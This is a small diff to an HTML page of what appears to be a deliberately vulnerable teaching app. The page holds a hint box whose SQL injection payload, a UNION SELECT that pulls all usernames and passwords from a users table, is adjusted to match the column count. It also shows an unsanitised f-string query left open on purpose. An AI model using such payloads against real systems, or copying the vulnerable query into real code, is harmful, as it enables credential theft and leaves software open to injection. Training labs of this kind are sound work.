@@ -47,7 +47,7 @@
                 
                 <div class="mt-4">
                     <div class="alert alert-warning">
-                        <strong>Try SQL Injection:</strong> Change the URL parameter to: <code>?id=1 UNION SELECT 'Injected', group_concat(username || ':' || password) FROM users</code>
+                        <strong>Try SQL Injection:</strong> Change the URL parameter to: <code>?id=1 UNION SELECT 'Injected', group_concat(username || ':' || password), 0, NULL FROM users</code>
                     </div>
                     <p>This user profile endpoint is vulnerable to SQL injection in the id parameter:</p>
                     <pre><code>query = f"SELECT username, email FROM users WHERE id = {id}"</code></pre>
